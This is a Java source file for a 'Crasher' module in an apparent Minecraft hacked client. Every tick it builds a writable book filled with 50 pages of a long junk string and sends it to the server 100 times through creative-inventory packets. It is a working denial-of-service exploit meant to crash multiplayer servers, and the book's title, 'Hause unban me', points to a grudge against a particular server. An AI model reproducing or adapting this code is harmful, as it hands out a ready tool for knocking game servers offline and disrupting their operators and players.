package best.reich.ingros.module.modules.other;

import best.reich.ingros.events.other.TickEvent;
import best.reich.ingros.events.other.WorldLoadEvent;
import me.xenforu.kelo.module.ModuleCategory;
import me.xenforu.kelo.module.annotation.ModuleManifest;
import me.xenforu.kelo.module.type.ToggleableModule;
import net.b0at.api.event.Subscribe;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

@ModuleManifest(label = "Crasher", category = ModuleCategory.OTHER, color = 0xAEDEDB)
public class Crasher extends ToggleableModule {

    @Subscribe
    public void onWorldEnter(WorldLoadEvent event) {
        toggle();
    }

    @Subscribe
    public void onTick(TickEvent event) {
        if (mc.world != null && mc.player != null) {
            final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tag = new NBTTagCompound();
            final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            for (int i = 0; i < 50; ++i) {
                final String siteContent = size;
                final NBTTagString tString = new NBTTagString(siteContent);
                list.appendTag(tString);
            }
            tag.setString("author", "Robearttt");
            tag.setString("title", "Hause unban me");
            tag.setTag("pages", list);
            book.setTagInfo("pages", list);
            book.setTagCompound(tag);
            for (int i = 0; i < 100; ++i) {
                if (mc.player.isSpectator()) {
                    break;
                }
                mc.getConnection().sendPacket(new CPacketCreativeInventoryAction(0, book));
            }
        }
    }
}
